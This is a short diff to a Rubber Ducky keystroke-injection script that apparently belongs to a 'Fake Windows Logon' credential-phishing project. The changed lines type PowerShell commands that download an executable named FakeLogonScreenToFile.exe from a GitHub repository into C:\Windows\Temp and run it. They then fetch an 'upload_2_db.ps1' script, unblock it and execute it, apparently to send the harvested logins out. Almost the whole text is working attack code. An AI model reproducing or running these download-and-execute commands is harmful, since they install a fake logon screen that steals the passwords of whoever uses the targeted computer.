@@ -16,10 +16,12 @@ DELAY 1000
 ALT y
 DELAY 800
 
-REM Download FakeLogonScreenToFile.exe and run it
-STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/raw/main/FakeLogonScreenToFile.exe', '$env:TEMP\FakeLogonScreenToFile.exe')
+REM Download and execute the .exe file
+STRING $url = 'https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait
 ENTER
-DELAY 800
-STRING Start-Process "$env:TEMP\FakeLogonScreenToFile.exe"
+DELAY 5000
+
+REM Download and execute the .ps1 script
+STRING $url = 'https://raw.githubusercontent.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/main/upload_2_db.ps1'; $output = 'C:\Windows\Temp\your_script.ps1'; Invoke-WebRequest -Uri $url -OutFile $output; Unblock-File -Path $output; . $output
 ENTER
-DELAY 300
+DELAY 5000
